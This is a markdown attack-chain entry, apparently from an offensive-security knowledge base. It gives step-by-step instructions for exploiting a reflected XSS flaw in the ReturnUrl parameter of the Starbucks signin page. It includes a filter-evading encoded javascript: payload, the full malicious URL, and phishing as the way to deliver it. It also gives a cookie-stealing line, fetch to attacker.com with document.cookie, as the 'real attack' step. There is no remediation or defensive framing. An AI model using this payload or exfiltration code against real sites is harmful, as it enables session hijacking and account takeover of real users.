---
id: ac-starbucks-xss-returnurl
tags:
  - xss
  - reflected-xss
  - web
  - authentication-bypass
  - code-execution
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Reflected-XSS-in-ReturnUrl-Parameter]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:19.984Z'
description: >-
  A multi-step attack exploiting a reflected XSS vulnerability in the ReturnUrl
  parameter of the Starbucks signin page, allowing arbitrary JavaScript
  execution after victim authentication.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Reflected XSS via ReturnUrl Parameter on Starbucks Signin Page for Post-Authentication Code Execution

Multi-stage attack chain demonstrating exploitation of a reflected XSS vulnerability in the ReturnUrl parameter during the signin process on Starbucks websites, leading to arbitrary JavaScript execution in the authenticated session.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Craft Malicious URL] --> B[Execution: Victim Login] --> C[Post-Auth Execution: JS Payload Runs]
    C --> D[Objective: Session Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome, Firefox)
- URL encoding tool (built-in browser dev tools or online encoder)

### Target Environment

- Web platform
- Starbucks signin page on www.starbucks.com or international variants (e.g., www.starbucks.ca, www.starbucks.co.uk)
- No specific ports or services beyond standard HTTPS (443)

### Initial Access Requirements

- Valid victim credentials for a Starbucks account
- Ability to trick victim into clicking the malicious URL (e.g., via phishing)
- No prior network access needed; public-facing web application

## Detailed Attack Procedures

### Step 1: Craft and Open Malicious URL
procedure: [[procedures/Exploit-Reflected-XSS-in-ReturnUrl-Parameter]]

**Objective**: Inject a JavaScript payload into the ReturnUrl parameter to prepare for XSS execution upon login.

**Instructions**: Construct the malicious URL by appending an encoded JavaScript payload to the ReturnUrl parameter. Use browser developer tools or a URL encoder to properly encode the payload. Example payload: `javascript:https://www.starbucks.com/%0Aalert(document.domain)` encoded as `%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529`.

Navigate to: `https://www.starbucks.com/account/signin?ReturnUrl=%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529`

**Expected Output**: The signin page loads with the malicious ReturnUrl parameter reflected in the response, but no immediate execution.

**Success Indicators**:
- Page loads without errors
- Inspect network response to confirm ReturnUrl parameter is present and unescaped

### Step 2: Authenticate with Victim Credentials
procedure: [[procedures/Exploit-Reflected-XSS-in-ReturnUrl-Parameter]]

**Objective**: Trigger the redirect after login, causing the reflected payload to execute in the authenticated context.

**Instructions**: On the loaded signin page, enter valid Starbucks account credentials (username/email and password) and submit the login form. The application will process the login and attempt to redirect using the tainted ReturnUrl.

**Expected Output**: Successful login, followed by immediate execution of the JavaScript payload (e.g., an alert box appears showing the document domain).

**Success Indicators**:
- Login succeeds
- JavaScript alert or other payload effect triggers post-redirect

### Step 3: Observe Payload Execution and Escalate
procedure: [[procedures/Exploit-Reflected-XSS-in-ReturnUrl-Parameter]]

**Objective**: Confirm arbitrary code execution in the victim's authenticated session and demonstrate potential for further compromise.

**Instructions**: Upon execution, the payload runs in the context of the authenticated Starbucks domain. For proof-of-concept, use an alert; in a real attack, replace with code to steal session cookies, keylog, or exfiltrate data (e.g., `fetch('https://attacker.com/steal?data=' + document.cookie)`).

**Expected Output**: Alert displays `www.starbucks.com` or equivalent domain, confirming same-origin execution. No server-side errors.

**Success Indicators**:
- Arbitrary JS runs without CSP blocks
- Access to authenticated resources (e.g., account dashboard) with payload effects
- Potential for session hijacking if cookies are exfiltrated

## Attack Chain Summary

### Key Achievements

1. Successful injection and reflection of JS payload in ReturnUrl without sanitization
2. Post-authentication execution of arbitrary code in victim's browser session
3. Demonstration of high-impact risks like account takeover or data theft on multiple Starbucks international sites

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
